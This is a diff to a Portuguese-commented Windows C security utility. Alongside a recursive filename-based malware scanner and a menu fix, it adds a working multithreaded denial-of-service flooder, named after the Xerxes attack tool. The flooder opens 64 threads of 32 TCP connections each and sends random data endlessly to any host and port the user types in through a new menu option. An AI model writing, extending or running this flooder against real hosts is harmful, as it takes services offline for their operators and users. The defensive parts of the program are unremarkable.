@@ -1,8 +1,25 @@
+#define WIN32_LEAN_AND_MEAN
+#define _WIN32_WINNT 0x0501
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <windows.h>
 #include <tlhelp32.h>
+#include <process.h>
+#include <direct.h>
+#include <ctype.h>
+
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+
+#define CONNECTIONS 8
+#define THREADS 48
+#define MAX_THREADS 64
+#define CONNECTIONS_PER_THREAD 32
+#define BUFFER_SIZE 1024
 
 // Função para pressionar teclas
 void pressKey(WORD vk) {
@@ -89,11 +106,144 @@ void monitorar_conexoes(char *log_resultados) {
     }
 }
 
-// Verificação de arquivos maliciosos
+// Função para converter string para minúsculas
+void toLowerCase(char *str) {
+    for(int i = 0; str[i]; i++){
+        str[i] = tolower(str[i]);
+    }
+}
+
+// Função para extrair o nome do arquivo do caminho completo
+void extractFileName(const char *path, char *fileName) {
+    const char *lastSlash = strrchr(path, '\\');
+    if (lastSlash != NULL) {
+        strcpy(fileName, lastSlash + 1);
+    } else {
+        strcpy(fileName, path);
+    }
+    toLowerCase(fileName);
+}
+
+// Função para verificar se um arquivo está na lista de malwares
+int checkMalwareList(const char *fileName, FILE *malwareList) {
+    char line[256];
+    char lowerFileName[256];
+    
+    strcpy(lowerFileName, fileName);
+    toLowerCase(lowerFileName);
+    
+    rewind(malwareList);
+    while (fgets(line, sizeof(line), malwareList)) {
+        // Remove newline if present
+        line[strcspn(line, "\n")] = 0;
+        toLowerCase(line);
+        
+        if (strstr(lowerFileName, line) != NULL) {
+            return 1; // Arquivo encontrado na lista de malwares
+        }
+    }
+    return 0; // Arquivo não encontrado na lista
+}
+
+// Função recursiva para escanear diretórios
+void scanDirectory(const char *path, FILE *malwareList, FILE *logFile) {
+    WIN32_FIND_DATA findData;
+    char searchPath[MAX_PATH];
+    char filePath[MAX_PATH];
+    char fileName[256];
+    HANDLE hFind;
+
+    // Prepara o caminho de busca
+    snprintf(searchPath, MAX_PATH, "%s\\*", path);
+
+    hFind = FindFirstFile(searchPath, &findData);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        return;
+    }
+
+    do {
+        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) {
+            continue;
+        }
+
+        // Constrói o caminho completo do arquivo/diretório
+        snprintf(filePath, MAX_PATH, "%s\\%s", path, findData.cFileName);
+
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            // Se for um diretório, faz a chamada recursiva
+            scanDirectory(filePath, malwareList, logFile);
+        } else {
+            // Se for um arquivo, verifica se está na lista de malwares
+            extractFileName(filePath, fileName);
+            if (checkMalwareList(fileName, malwareList)) {
+                fprintf(logFile, "[ALERTA] Possível malware encontrado: %s\n", filePath);
+                printf("[ALERTA] Possível malware encontrado: %s\n", filePath);
+            }
+        }
+    } while (FindNextFile(hFind, &findData));
+
+    FindClose(hFind);
+}
+
+// Função aprimorada de verificação de malware
 void verificar_malware() {
-    printf("Iniciando verificacao de malwares...\n");
-    system("dir /s /b C:\\ > file_list.txt");
-    printf("Verificacao concluida. Verifique o arquivo file_list.txt\n");
+    char currentPath[MAX_PATH];
+    FILE *malwareList, *logFile;
+    char buffer[1024];
+    int totalFiles = 0;
+    int malwareFound = 0;
+
+    printf("Iniciando verificacao aprimorada de malwares...\n");
+
+    // Abre a lista de malwares conhecidos
+    malwareList = fopen("malware_list.txt", "r");
+    if (!malwareList) {
+        printf("Erro: Arquivo malware_list.txt nao encontrado!\n");
+        printf("Por favor, crie um arquivo malware_list.txt com nomes de malwares conhecidos.\n");
+        return;
+    }
+
+    // Cria/abre arquivo de log
+    logFile = fopen("scan_results.txt", "w");
+    if (!logFile) {
+        printf("Erro ao criar arquivo de log!\n");
+        fclose(malwareList);
+        return;
+    }
+
+    // Obtém o diretório atual
+    if (_getcwd(currentPath, sizeof(currentPath)) == NULL) {
+        printf("Erro ao obter diretorio atual!\n");
+        fclose(malwareList);
+        fclose(logFile);
+        return;
+    }
+
+    fprintf(logFile, "=== Scan de Malware Iniciado ===\n");
+    fprintf(logFile, "Diretório base: %s\n\n", currentPath);
+    
+    // Inicia o scan recursivo
+    printf("Escaneando arquivos...\n");
+    scanDirectory("C:\\", malwareList, logFile);
+
+    fprintf(logFile, "\n=== Scan de Malware Concluído ===\n");
+    fclose(logFile);
+    fclose(malwareList);
+
+    // Exibe resultados do scan
+    printf("\nVerificacao concluida!\n");
+    printf("Os resultados foram salvos em 'scan_results.txt'\n");
+
+    // Exibe o conteúdo do arquivo de resultados
+    logFile = fopen("scan_results.txt", "r");
+    if (logFile) {
+        printf("\nConteudo do arquivo de resultados:\n");
+        printf("===================================\n");
+        while (fgets(buffer, sizeof(buffer), logFile)) {
+            printf("%s", buffer);
+        }
+        fclose(logFile);
+    }
 }
 
 void monitorar_arp(char *log_resultados) {
@@ -123,6 +273,129 @@ int atualizar_lista(const char *arquivo, const char *entrada) { // Change return
         printf("Erro ao abrir a lista %s\n", arquivo);
         return 0; // Failure
     }
+}
+
+// Estrutura para passar parâmetros para as threads
+typedef struct {
+    const char *host;
+    const char *port;
+    int thread_id;
+} ThreadData;
+
+// Função de ataque aprimorada para cada thread
+unsigned __stdcall enhanced_attack_thread(void *arg) {
+    ThreadData *data = (ThreadData *)arg;
+    SOCKET sockets[CONNECTIONS_PER_THREAD];
+    struct addrinfo hints, *servinfo, *p;
+    int r;
+    char attack_buffer[BUFFER_SIZE];
+    
+    // Inicializa o buffer de ataque com dados aleatórios
+    for (int i = 0; i < BUFFER_SIZE; i++) {
+        attack_buffer[i] = rand() % 255 + 1;
+    }
+
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+
+    if (getaddrinfo(data->host, data->port, &hints, &servinfo) != 0) {
+        printf("Thread %d: getaddrinfo falhou\n", data->thread_id);
+        return 1;
+    }
+
+    // Inicializa array de sockets
+    for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
+        sockets[i] = INVALID_SOCKET;
+    }
+
+    printf("Thread %d: Iniciando ataque...\n", data->thread_id);
+
+    while (1) {
+        for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
+            if (sockets[i] == INVALID_SOCKET) {
+                // Tenta estabelecer nova conexão
+                for (p = servinfo; p != NULL; p = p->ai_next) {
+                    sockets[i] = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
+                    if (sockets[i] == INVALID_SOCKET) {
+                        continue;
+                    }
+
+                    // Configura socket para não-bloqueante
+                    unsigned long mode = 1;
+                    ioctlsocket(sockets[i], FIONBIO, &mode);
+
+                    // Tenta conectar
+                    connect(sockets[i], p->ai_addr, p->ai_addrlen);
+                    break;
+                }
+            } else {
+                // Envia dados em conexões existentes
+                int send_result = send(sockets[i], attack_buffer, BUFFER_SIZE, 0);
+                if (send_result == SOCKET_ERROR) {
+                    closesocket(sockets[i]);
+                    sockets[i] = INVALID_SOCKET;
+                } else {
+                    printf("Thread %d: Pacote enviado pelo socket %d\n", data->thread_id, i);
+                }
+            }
+        }
+        Sleep(10); // Pequeno delay para não sobrecarregar o CPU
+    }
+
+    // Cleanup
+    freeaddrinfo(servinfo);
+    for (int i = 0; i < CONNECTIONS_PER_THREAD; i++) {
+        if (sockets[i] != INVALID_SOCKET) {
+            closesocket(sockets[i]);
+        }
+    }
+    return 0;
+}
+
+// Função Xerxes aprimorada
+void xerxes_attack(const char *host, const char *port) {
+    WSADATA wsa;
+    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
+        printf("Falha ao inicializar Winsock.\n");
+        return;
+    }
+
+    HANDLE threads[MAX_THREADS];
+    ThreadData thread_data[MAX_THREADS];
+
+    printf("Iniciando ataque Xerxes aprimorado contra %s:%s\n", host, port);
+    printf("Utilizando %d threads com %d conexoes por thread\n", MAX_THREADS, CONNECTIONS_PER_THREAD);
+
+    // Inicia as threads
+    for (int i = 0; i < MAX_THREADS; i++) {
+        thread_data[i].host = host;
+        thread_data[i].port = port;
+        thread_data[i].thread_id = i;
+
+        threads[i] = (HANDLE)_beginthreadex(NULL, 0, enhanced_attack_thread, &thread_data[i], 0, NULL);
+        if (threads[i] == NULL) {
+            printf("Erro ao criar thread %d\n", i);
+            continue;
+        }
+        Sleep(100); // Pequeno delay entre criação de threads
+    }
+
+    // Aguarda comando para encerrar
+    printf("\nPressione Enter para encerrar o ataque...\n");
+    getchar();
+    getchar();
+
+    // Encerra as threads
+    for (int i = 0; i < MAX_THREADS; i++) {
+        if (threads[i] != NULL) {
+            TerminateThread(threads[i], 0);
+            CloseHandle(threads[i]);
+        }
+    }
+
+    WSACleanup();
+    printf("Ataque encerrado.\n");
 }
 
 // Menu principal
@@ -158,8 +431,9 @@ void menu() {
             "6  - Adicionar a blacklist",
             "7  - Bloquear IPs da blacklist",
             "8  - Desbloquear IPs da blacklist",
-            "9  - Monitorar tabela ARP (detectar MITM)"
-            "10 - Sair",
+            "9  - Monitorar tabela ARP (detectar MITM)",
+            "10 - Executar Xerxes",
+            "11 - Sair"
         };
 
         int num_linhas_menu = sizeof(menu_linhas) / sizeof(menu_linhas[0]);
@@ -236,14 +510,26 @@ void menu() {
                 strcat(log_resultados, "Desbloqueio de IPs da blacklist concluido.\n");
                 break;
             case 9:
+                monitorar_arp(log_resultados);
+                strcpy(ultima_acao, "Monitoramento de ARP realizado.");
+                break;
+            case 10: {
+                char host[256];
+                char port[6];
+                printf("Digite o host alvo: ");
+                scanf("%s", host);
+                printf("Digite a porta: ");
+                scanf("%s", port);
+                xerxes_attack(host, port);
+                sprintf(ultima_acao, "Xerxes executado contra %s:%s", host, port);
+                sprintf(log_resultados + strlen(log_resultados), "Xerxes iniciado contra %s:%s\n", host, port);
+                break;
+            }
+            case 11:
                 exit(0);
             default:
                 strcpy(ultima_acao, "Opcao invalida selecionada.");
                 strcat(log_resultados, "Opcao invalida inserida.\n");
-                break;
-            case 10:
-                monitorar_arp(log_resultados);
-                strcpy(ultima_acao, "Monitoramento de ARP realizado.");
                 break;
         }
     }
@@ -253,3 +539,4 @@ int main() {
     menu();
     return 0;
 }
+
